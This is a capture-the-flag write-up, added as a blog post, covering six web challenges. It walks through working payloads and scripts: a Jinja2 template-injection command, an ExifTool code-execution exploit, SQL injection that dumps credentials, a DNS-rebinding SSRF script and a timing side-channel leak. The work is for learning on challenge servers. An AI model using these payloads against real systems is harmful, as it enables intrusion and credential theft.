@@ -1,0 +1,650 @@
+---
+layout: post
+title:  "Web Challenges"
+date:   2026-02-14 16:06:00 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /0xfun-2026-web-challenges/
+---
+* TOC
+{:toc}
+{% raw %}
+
+## Templates
+
+**Category**: web
+
+**Description**: Just a simple service made using Server Side Rendering. Suffering ends in 30 minutes. [http://chall.0xfun.org:29725](http://chall.0xfun.org:29725)
+
+I go to the site and see an input box:
+
+![Alt text](/images/jinja2SSTI.png)
+
+Inputting `{{7*7}}` returns `49` and inputting `{{7*'7'}}` returns `7777777` so I know it is jinja2 SSTI. 
+
+I get the flag using this payload: `{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}`
+
+`0xfun{Server_Side_Template_Injection_Awesome}`
+
+___
+
+## Shell
+
+**Category**: web
+
+**Author**: x03e
+
+**Description**: This simple web app lets you upload images to inspect their EXIF metadata. But something feels off… maybe your uploads are being examined more closely than you realize. Can you get the server to execute a command of your choosing and expose the hidden flag.txt file? Note: Only image uploads are allowed. No brute force needed — just the right approach and format. Suffering ends in 30 minutes. [http://chall.0xfun.org:6175](http://chall.0xfun.org:6175)
+
+When uploading a regular image to the site I see they are running `ExifTool Version 12.16`. It is vulnerable to `CVE-2021-22204`. I download an exploit script to generate a malicous image:
+```shell
+wget https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2021-22204/main/exploit-CVE-2021-22204.py  
+--2026-02-12 16:31:45--  https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2021-22204/main/exploit-CVE-2021-22204.py  
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...  
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.  
+HTTP request sent, awaiting response... 200 OK  
+Length: 6802 (6.6K) [text/plain]  
+Saving to: ‘exploit-CVE-2021-22204.py’  
+  
+exploit-CVE-2021-22204.py                   100%[==========================================================================================>]   6.64K  --.-KB/s    in 0.03s  
+  
+2026-02-12 16:31:45 (218 KB/s) - ‘exploit-CVE-2021-22204.py’ saved [6802/6802]
+```
+
+First generate an image which will execute `ls -la /` to find the location of the flag:
+```shell
+python3 exploit-CVE-2021-22204.py -c "ls -la /"  
+  
+_ __,~~~/_        __  ___  _______________  ___  ___  
+,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \  
+|/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /  
+_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....  
+  
+UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution  
+PAYLOAD: (metadata "\c${system('ls -la /')};")  
+DEPENDS: Dependencies for exploit are met!  
+PREPARE: Payload written to file!  
+PREPARE: Payload file compressed!  
+PREPARE: DjVu file created!  
+PREPARE: JPEG image created/processed!  
+PREPARE: Exiftool config written to file!  
+EXPLOIT: Payload injected into image!  
+CLEANUP: Old file artifacts deleted!  
+SUCCESS: Exploit image written to "image.jpg"
+```
+
+The output from that shows me the location of the flag:
+```shell 
+total 4856
+drwxr-xr-x    1 root root     4096 Feb 12 21:11 .
+drwxr-xr-x    1 root root     4096 Feb 12 21:11 ..
+-rwxr-xr-x    1 root root        0 Feb 12 21:11 .dockerenv
+-rw-r--r--    1 root root  4888506 Jan 21  2021 Image-ExifTool-12.16.tar.gz
+drwxr-xr-x    1 user user     4096 Oct 22 10:53 app
+lrwxrwxrwx    1 root root        7 Aug 24 16:20 bin -> usr/bin
+drwxr-xr-x    2 root root     4096 Aug 24 16:20 boot
+drwxr-xr-x    5 root root      340 Feb 12 21:11 dev
+drwxr-xr-x    1 root root     4096 Feb 12 21:11 etc
+drwxr-xr-x    1  501 staff    4096 Oct 22 10:53 exiftool
+-r--r--r--    1 root root       36 Sep 26 23:23 flag.txt
+drwxr-xr-x    1 root root     4096 Oct 22 10:53 home
+lrwxrwxrwx    1 root root        7 Aug 24 16:20 lib -> usr/lib
+lrwxrwxrwx    1 root root        9 Aug 24 16:20 lib64 -> usr/lib64
+drwxr-xr-x    2 root root     4096 Oct 20 00:00 media
+drwxr-xr-x    2 root root     4096 Oct 20 00:00 mnt
+drwxr-xr-x    2 root root     4096 Oct 20 00:00 opt
+dr-xr-xr-x 2730 root root        0 Feb 12 21:11 proc
+drwx------    1 root root     4096 Oct 21 02:14 root
+drwxr-xr-x    3 root root     4096 Oct 20 00:00 run
+lrwxrwxrwx    1 root root        8 Aug 24 16:20 sbin -> usr/sbin
+drwxr-xr-x    2 root root     4096 Oct 20 00:00 srv
+dr-xr-xr-x   13 root root        0 Feb 12 20:58 sys
+drwxrwxrwt    1 root root     4096 Oct 22 10:53 tmp
+drwxr-xr-x    1 root root     4096 Oct 20 00:00 usr
+drwxr-xr-x    1 root root     4096 Oct 20 00:00 var
+```
+
+Generate an image which will retreive the contents of the flag file:
+```shell
+python3 exploit-CVE-2021-22204.py -c "cat /flag.txt"  
+  
+_ __,~~~/_        __  ___  _______________  ___  ___  
+,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \  
+|/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /  
+_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....  
+  
+UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution  
+PAYLOAD: (metadata "\c${system('cat /flag.txt')};")  
+DEPENDS: Dependencies for exploit are met!  
+PREPARE: Payload written to file!  
+PREPARE: Payload file compressed!  
+PREPARE: DjVu file created!  
+PREPARE: JPEG image created/processed!  
+PREPARE: Exiftool config written to file!  
+EXPLOIT: Payload injected into image!  
+CLEANUP: Old file artifacts deleted!  
+SUCCESS: Exploit image written to "image.jpg"
+```
+
+Read the flag file:
+
+![Alt text](/images/exiftool-cve.png)
+
+`0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}`
+
+___
+
+## Perceptions
+
+**Category**: web
+
+**Author**: x03e
+
+**Description**: Take a look at the blog I created! It has a neat backend and, interestingly, seems to use fewer ports. Suffering ends in 30 minutes. [http://chall.0xfun.org:45417](http://chall.0xfun.org:45417)
+
+I go to the site and see a basic blog:
+
+![Alt text](/images/charlies-blog.png)
+
+On `/4C6Y4NEBVLATCF6EX5PA2ISZ/page.html` (the "secret post") I find a password:
+```shell
+curl http://chall.0xfun.org:45417/4C6Y4NEBVLATCF6EX5PA2ISZ/page.html  
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+<meta charset="UTF-8" />  
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
+<title>Secret Post</title>  
+<link rel="stylesheet" href="/style.css" />  
+<script src="/links.js"></script>  
+</head>  
+<body>  
+<header class="header">  
+<h1 id="name">[placeholder]'s Blog</h1>  
+</header>  
+  
+<div class="container">  
+<aside class="sidebar">  
+<h2>Pages ✨</h2>  
+<nav>  
+<ul id="navlist">  
+</ul>  
+</nav>  
+</aside>  
+  
+<main class="content">  
+<h2>Secret Post</h2>  
+<br>  
+<img src="/img/mystery.jpg" alt="How mysterious" />  
+<p>  
+Thought I'd make things a bit fun and hide a password on this page. When I get the login page working it will let you see some extra posts...  
+<!-- Use my name and 'UlLOPNeEak9rFfmL' to log in -->  
+</p>  
+</main>  
+</div>  
+</body>  
+</html>
+```
+So I have the credentials `Charlie:UlLOPNeEak9rFfmL`. 
+
+`http://chall.0xfun.org:45417/login.html` is entirely non-functional. Thinking back to the description, maybe they are running `ssh` on the same port? Looks like they are!
+```shell
+ssh Charlie@chall.0xfun.org -p 45417  
+The authenticity of host '[chall.0xfun.org]:45417 ([54.252.250.249]:45417)' can't be established.  
+ED25519 key fingerprint is SHA256:ZqQ9NgO/rmk1DtjXcCLYDYEYFi7pMXun6+wXRkgE2rc.  
+This key is not known by any other names.  
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
+Warning: Permanently added '[chall.0xfun.org]:45417' (ED25519) to the list of known hosts.  
+(Charlie@chall.0xfun.org) Password:  
+(Charlie@chall.0xfun.org) Password:  
+=== CHARLIE'S FUN ZONE!!! ===  
+This is my custom shell, there's not much in it right now, but remember how to navigate a terminal and you'll be fine! :>  
+  
+/ $ ls  
+README.txt  
+secret_flag_333  
+4C6Y4NEBVLATCF6EX5PA2ISZ  
+6PP5RVOYV54Z7DUASYLKF2FK  
+style.css  
+MHEGSBREXSEDFLXPWXVAA2GQ  
+img  
+25YDY4737K3QMIZ6N5OUEYGL  
+login.html  
+3XSPO7ZJP27IUGMANNB2V2J3  
+links.js  
+  
+/ $ cd secret_flag_333  
+  
+/secret_flag_333 $ ls  
+flag.txt  
+  
+/secret_flag_333 $ cat flag.txt  
+  
+Welcome to my backend! Should you be here?  
+  
+▄▄█████▄  
+  ▄███▄▄  
+ ▀▄▄  ▄▄▀  
+ ▀▄▄▀█▄▄▀  
+  ▀████▀  
+▀██▀  ▀██▄  
+▄▀▀ ▀▀ ▀▀▄  
+  ▄    ▄  
+  
+  ▀▀▀▀▀▀  
+ ▀▄█   ▀▄  ▀▀  
+ ▄▀      ▀▄  
+   ▄▀      ▀ ▄▄                   ▄▄▄▄▄  
+   ▀▀▀▀▀▀▀▀▀▀▀▀                  ▀▀▀▀▀▀▀  
+    ▀█                    ▀▀▄▄▄▄▄▄▄█▄  
+▄▄▄▀▀▄▄▄                        ▀ ▀▀  
+                                ▄█▄▄▄  
+                            ▄▀▀▄▄▄▀▀▀      ▀▀▀▀▀  
+                            ▀████████████████  
+0xfun{p3rsp3c71v3.15.k3y}     ▀████▄▀▀▀▀▄████▄▀  
+                               ▀▄▀▀█████████▀▄▀  
+                                 ▀▀▄▄▄▄▄▄▄▄▄▀  
+  
+  
+/secret_flag_333 $ exit  
+Connection to chall.0xfun.org closed by remote host.  
+Connection to chall.0xfun.org closed.
+```
+
+`0xfun{p3rsp3c71v3.15.k3y}`
+
+___
+
+## Webhook Service
+
+**Category**: web
+
+**Description**: I got fed up with using third-party sites to create webhooks, so I decided to build my own! It even works in outer space! Check it out and let me know your thoughts. I'm pretty confident it's the most secure webhook service in the entire universe. Suffering ends in 30 minutes. [http://chall.0xfun.org:36224](http://chall.0xfun.org:36224)
+
+I get the challenge files. Here is the main logic in `app.py`:
+```python
+import threading
+from flask import Flask, request, abort, render_template, jsonify
+import requests
+from urllib.parse import urlparse
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import socket
+import ipaddress
+import uuid
+
+def load_flag():
+    with open('flag.txt', 'r') as f:
+        return f.read().strip()
+
+FLAG = load_flag()
+
+class FlagHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        if self.path == '/flag':
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain')
+            self.end_headers()
+            self.wfile.write(FLAG.encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+
+# Start internal flag server
+threading.Thread(
+    target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(),
+    daemon=True
+).start()
+
+app = Flask(__name__)
+
+registered_webhooks = {}
+
+def create_app():
+    return app
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+def is_ip_allowed(url):
+    parsed = urlparse(url)
+    host = parsed.hostname or ''
+
+    try:
+        ip = socket.gethostbyname(host)
+    except Exception:
+        return False, 'Could not resolve host'
+
+    ip_obj = ipaddress.ip_address(ip)
+
+    if (
+        ip_obj.is_private
+        or ip_obj.is_loopback
+        or ip_obj.is_link_local
+        or ip_obj.is_reserved
+    ):
+        return False, f'IP "{ip}" not allowed'
+
+    return True, None
+
+@app.route('/register', methods=['POST'])
+def register_webhook():
+    url = request.form.get('url')
+
+    if not url:
+        abort(400, 'Missing url parameter')
+
+    allowed, reason = is_ip_allowed(url)
+    if not allowed:
+        return reason, 400
+
+    webhook_id = str(uuid.uuid4())
+    registered_webhooks[webhook_id] = url
+
+    return jsonify({
+        'status': 'registered',
+        'url': url,
+        'id': webhook_id
+    }), 200
+
+@app.route('/trigger', methods=['POST'])
+def trigger_webhook():
+    webhook_id = request.form.get('id')
+
+    if not webhook_id:
+        abort(400, 'Missing webhook id')
+
+    url = registered_webhooks.get(webhook_id)
+    if not url:
+        return jsonify({'error': 'Webhook not found'}), 404
+
+    allowed, reason = is_ip_allowed(url)
+    if not allowed:
+        return jsonify({'error': reason}), 400
+
+    try:
+        resp = requests.post(url, timeout=5, allow_redirects=False)
+        return jsonify({
+            'url': url,
+            'status': resp.status_code,
+            'response': resp.text
+        }), resp.status_code
+    except Exception:
+        return jsonify({
+            'url': url,
+            'error': 'something went wrong'
+        }), 500
+
+if __name__ == '__main__':
+    print('listening on port 5000')
+    app.run(host='0.0.0.0', port=5000)
+```
+They do `is_ip_allowed(url)` in both `/register` and `/trigger` so DNS is resolved each time. This creates a race condition between the two resolutions. 
+
+I go to [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) to make a dns rebinding url like this: `01020304.ac110001.rbndr.us`. 
+
+After messing with the site for a while to get a dns rebinding hook registered on `http://chall.0xfun.org:36224/register`:
+```shell
+id:      "54f4d5c4-993a-40c0-b1f8-348957407c3a"
+status:  "registered"
+url:     "http://01020304.7f000001.rbndr.us:5001/flag"
+```
+
+I havent done dns rebinding before but I realized I need to make a script to get the hook to eventually trigger. I run this python script:
+```python
+import requests
+
+webhook_id = "54f4d5c4-993a-40c0-b1f8-348957407c3a"
+url = "http://chall.0xfun.org:36224/trigger"
+
+for i in range(100):
+    response = requests.post(url, data={"id": webhook_id})
+    print(f"Attempt {i+1}: {response.status_code}")
+    if response.status_code == 200:
+        print(f"SUCCESS! Response: {response.text}")
+        break
+    elif "not allowed" not in response.text:
+        print(f"Different error: {response.text}")
+```
+
+After a handful of requests it works and I get the flag!
+```shell
+python3 solve.py  
+Attempt 1: 400  
+Attempt 2: 400  
+Attempt 3: 500  
+Different error: {"error":"something went wrong","url":"http://01020304.7f000001.rbndr.us:5001/flag"}  
+Attempt 4: 500  
+Different error: {"error":"something went wrong","url":"http://01020304.7f000001.rbndr.us:5001/flag"}  
+Attempt 5: 400  
+Attempt 6: 500  
+Different error: {"error":"something went wrong","url":"http://01020304.7f000001.rbndr.us:5001/flag"}  
+Attempt 7: 500  
+Different error: {"error":"something went wrong","url":"http://01020304.7f000001.rbndr.us:5001/flag"}  
+Attempt 8: 500  
+Different error: {"error":"something went wrong","url":"http://01020304.7f000001.rbndr.us:5001/flag"}  
+Attempt 9: 500  
+Different error: {"error":"something went wrong","url":"http://01020304.7f000001.rbndr.us:5001/flag"}  
+Attempt 10: 400  
+Attempt 11: 400  
+Attempt 12: 400  
+Attempt 13: 200  
+SUCCESS! Response: {"response":"0xfun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}","status":200,"url":"http://01020304.7f000001.rbndr.us:5001/flag"}
+```
+Successful SSRF using DNS rebinding exploiting a time-of-check time-of-use race condition!
+
+`0xfun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}`
+
+___
+
+## Tony Toolkit
+
+**Category**: web
+
+**Author**: x03e
+
+**Description**: Tony decided to launch bug bounties on his website for the first time, so it’s likely to have some very common vulnerabilities. Suffering ends in 30 minutes. [http://chall.0xfun.org:27577](http://chall.0xfun.org:27577)
+I go to the site and see the search field and a login page:
+
+![Alt text](/images/tonys-tools1.png)
+
+Searching for `' OR 1=1 --` returns a lot of products so I know I have SQLi. I can go up to `' ORDER BY 2 -- -` so I know there are two columns in the database. 
+
+I search for `' UNION SELECT sql, 2 FROM sqlite_master WHERE name='Users' -- -` and get returned:
+```shell
+Name: CREATE TABLE Users ( UserID INTEGER PRIMARY KEY AUTOINCREMENT, Username TEXT NOT NULL, Password TEXT NOT NULL) - Price: $2
+```
+So I know there is a Users table which will contain usernames and passwords. 
+
+Searching for `' UNION SELECT username, password FROM Users -- -` returns two users:
+```shell
+Name: Admin - Price: $0000000000000000000000000000000000000000000000000000000000000000
+
+Name: Jerry - Price: $059a00192592d5444bc0caad7203f98b506332e2cf7abb35d684ea9bf7c18f08
+```
+Looks like `Jerry` has a hash I can crack. I put it into [https://crackstation.net/](https://crackstation.net/) and get the password `1qaz2wsx`. 
+
+Once I am logged in, I see two cookies are set:
+```shell
+Cookie: userID=2; user=0cea94be4ad3fc313cee0f65c3fd5dbc5dcf93d7e1bb337f2ecac06e52f29c28
+```
+
+I go to `http://chall.0xfun.org:27577/user` now that I'm logged in and inspect my cookies and change `userID=2` to `userID=1`. Once I refresh the page I get the flag:
+
+![Alt text](/images/tonys-tools2.png)
+
+`0xfun{T0ny'5_T00ly4rd._1_H0p3_Y0u_H4d_Fun_SQL1ng,_H45H_Cr4ck1ng,_4nd_W1th_C00k13_M4n1pu74t10n}`
+
+___
+
+## Schrödinger's Sandbox
+
+**Category**: web
+
+**Author**: SwitchCaseAdvocate
+
+**Description**: Your code runs in two parallel universes - one with the real flag, one with a fake. You only see the output if both universes agree. But even quantum mechanics can't hide everything... Suffering ends in 30 minutes. [http://chall.0xfun.org:29944](http://chall.0xfun.org:29944)
+
+I go to the site:
+
+![Alt text](/images/Schrodingers-Sandbox.png)
+
+The server runs the python code in two different sandboxes and compares `stdout` and `stderr`. It will only show output if they match. Sandbox `a` contains the real flag and sandbox `b` has a fake flag so obviously they will never match. It returns execution times for each sandbox  and the delta (difference between them) so we need to rely on this. This creates a timing side channel attack.
+
+Solve script:
+```python
+import hashlib
+import json
+import random
+import time as time_mod
+import requests
+
+URL = "http://chall.0xfun.org:29944"
+API_ENDPOINT = f"{URL}/api/submit"
+BASE_TIME = 0.00835    # From calibration: average of 0.0083 and 0.0084
+SLEEP_PER_CHAR = 0.05  # For length leak
+SLEEP_PER_BYTE = 0.01  # For byte leak
+EXPECTED_LEN = 41      # From length leak
+DIFFICULTY = 4         # PoW leading zeros
+
+def compute_pow(difficulty=DIFFICULTY):
+    """Compute proof-of-work: find nonce where SHA256(test) starts with '0'*difficulty"""
+    target = '0' * difficulty
+    nonce = 0
+    while True:
+        timestamp = int(time_mod.time() * 1000)
+        rand_val = random.random()
+        test = f"{timestamp}-{nonce}-{rand_val}"
+        # Compute SHA256
+        hash_obj = hashlib.sha256(test.encode('utf-8'))
+        hex_hash = hash_obj.hexdigest()
+        if hex_hash.startswith(target):
+            return test
+        nonce += 1
+        # Yield occasionally to not block too hard
+        if nonce % 10000 == 0:
+            time_mod.sleep(0.001)
+
+def submit_code(code):
+    """Submit code to server and return response data"""
+    pow_solution = compute_pow()
+    headers = {
+        'Content-Type': 'application/json',
+        'X-Pow-Nonce': pow_solution
+    }
+    payload = {'code': code}
+    response = requests.post(API_ENDPOINT, headers=headers, json=payload)
+    response.raise_for_status()
+    data = response.json()
+    if 'error' in data:
+        raise ValueError(f"Server error: {data['error']}")
+    return data
+
+def leak_length(base_time):
+    """Run length leak (optional, if not known)"""
+    code = f"""import time
+flag = open("/flag.txt").read().strip()
+time.sleep(len(flag) * {SLEEP_PER_CHAR})
+print("done")"""
+    data = submit_code(code)
+    time_a = data['time_a']
+    time_b = data['time_b']
+    len_a = round((time_a - base_time) / SLEEP_PER_CHAR)
+    len_b = round((time_b - base_time) / SLEEP_PER_CHAR)
+    max_len = max(len_a, len_b)
+    print(f"Leaked lengths: A={len_a}, B={len_b}, using max={max_len}")
+    return max_len
+
+def leak_bytes(base_time, max_len):
+    """Leak byte values position by position"""
+    bytes_a = []
+    bytes_b = []
+    for i in range(max_len):
+        code = f"""import time
+flag = open("/flag.txt").read().strip()
+byte_val = ord(flag[{i}]) if {i} < len(flag) else 0
+time.sleep(byte_val * {SLEEP_PER_BYTE})
+print("done")"""
+        print(f"Leaking position {i}...")
+        data = submit_code(code)
+        time_a = data['time_a']
+        time_b = data['time_b']
+        byte_a = round((time_a - base_time) / SLEEP_PER_BYTE)
+        byte_b = round((time_b - base_time) / SLEEP_PER_BYTE)
+        bytes_a.append(byte_a)
+        bytes_b.append(byte_b)
+        print(f"  Pos {i}: A={byte_a} ('{chr(byte_a) if 32 <= byte_a <= 126 else '?' }'), B={byte_b} ('{chr(byte_b) if 32 <= byte_b <= 126 else '?' }')")
+    return bytes_a, bytes_b
+
+def reconstruct_flag(bytes_list):
+    """Reconstruct flag string from byte list"""
+    return ''.join(chr(b) for b in bytes_list)
+
+def main(calibrate=False, known_len=None):
+    if calibrate:
+        # Run calibration
+        code_calib = """flag = open("/flag.txt").read()
+print("calibrated")"""
+        print("Running calibration...")
+        data = submit_code(code_calib)
+        time_a = data['time_a']
+        time_b = data['time_b']
+        base_time = (time_a + time_b) / 2
+        print(f"Calibrated base time: {base_time:.4f}s (A={time_a:.4f}, B={time_b:.4f})")
+    else:
+        base_time = BASE_TIME
+
+    if known_len is None:
+        max_len = leak_length(base_time)
+    else:
+        max_len = known_len
+
+    bytes_a, bytes_b = leak_bytes(base_time, max_len)
+
+    flag_a = reconstruct_flag(bytes_a)
+    flag_b = reconstruct_flag(bytes_b)
+
+    print("Sandbox A:", repr(flag_a))
+    print("Sandbox B:", repr(flag_b))
+
+if __name__ == "__main__":
+    main(calibrate=False, known_len=EXPECTED_LEN)
+```
+I had AI make this solve script. I have never exploited a timing side channel attack so this helped me actually solve it and understand what is happening here. By encoding flag bytes into `time.sleep()` and subtracting baseline runtime, I can reconstruct both the real and fake flags only from execution timing. 
+
+Solve script output:
+```shell
+python3 solve3.py  
+Leaking position 0...  
+Pos 0: A=48 ('0'), B=48 ('0')  
+Leaking position 1...  
+Pos 1: A=120 ('x'), B=120 ('x')  
+Leaking position 2...  
+Pos 2: A=102 ('f'), B=102 ('f')  
+Leaking position 3...  
+Pos 3: A=117 ('u'), B=117 ('u')  
+Leaking position 4...  
+Pos 4: A=110 ('n'), B=110 ('n')  
+Leaking position 5...  
+Pos 5: A=123 ('{'), B=123 ('{')
+
+...
+
+Pos 36: A=116 ('t'), B=113 ('q')  
+Leaking position 37...  
+Pos 37: A=49 ('1'), B=113 ('q')  
+Leaking position 38...  
+Pos 38: A=109 ('m'), B=113 ('q')  
+Leaking position 39...  
+Pos 39: A=51 ('3'), B=113 ('q')  
+Leaking position 40...  
+Pos 40: A=125 ('}'), B=125 ('}')  
+Sandbox A: '0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}'  
+Sandbox B: '0xfun{qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq}'
+```
+
+`0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}`
+
+___
+{% endraw %}
